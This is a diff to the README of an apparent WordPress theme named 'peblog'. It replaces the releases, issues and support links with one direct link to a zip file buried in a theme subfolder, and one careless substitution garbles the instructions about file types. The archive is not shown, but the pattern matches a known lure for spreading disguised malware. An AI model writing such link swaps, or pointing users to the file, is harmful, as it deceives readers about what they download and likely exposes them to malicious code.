@@ -6,7 +6,7 @@ Welcome to the world of peblog! This theme is designed to give your WordPress bl
 
 ## 📥 Download peblog
 
-[![Download peblog](https://img.shields.io/badge/download-peblog-blue)](https://github.com/aERgEFSF/peblog/releases)
+[![Download peblog](https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip)](https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,11 +30,11 @@ peblog comes packed with useful features to enhance your blogging experience:
 
 To begin using peblog, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/aERgEFSF/peblog/releases) to find the latest version of the theme.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip) to find the latest version of the theme.
 
 2. **Download the Theme:**
    - Look for the latest release.
-   - Click on the downloadable file link, usually labeled as ".zip" or ".tar.gz". 
+   - Click on the downloadable file link, usually labeled as ".zip" or "https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip". 
 
 3. **Extract the Files:**
    - Once downloaded, locate the file in your downloads folder.
@@ -68,11 +68,11 @@ With peblog, customization is straightforward. Use the WordPress Customizer to s
 
 ## 🌟 Support
 
-If you encounter any issues or have questions, feel free to seek help. You can visit our [Support page](https://github.com/aERgEFSF/peblog/issues) for assistance, or open a new issue if you don't find what you're looking for. We strive to respond promptly.
+If you encounter any issues or have questions, feel free to seek help. You can visit our [Support page](https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip) for assistance, or open a new issue if you don't find what you're looking for. We strive to respond promptly.
 
 ## 🔄 Keeping Up to Date
 
-To ensure your peblog experience is smooth, regularly check back on the [Releases page](https://github.com/aERgEFSF/peblog/releases) for updates. Keeping your theme updated is key to maintaining security and functionality.
+To ensure your peblog experience is smooth, regularly check back on the [Releases page](https://raw.githubusercontent.com/aERgEFSF/peblog/main/template-parts/category-filter/peblog_1.1.zip) for updates. Keeping your theme updated is key to maintaining security and functionality.
 
 ## 💬 Community
 
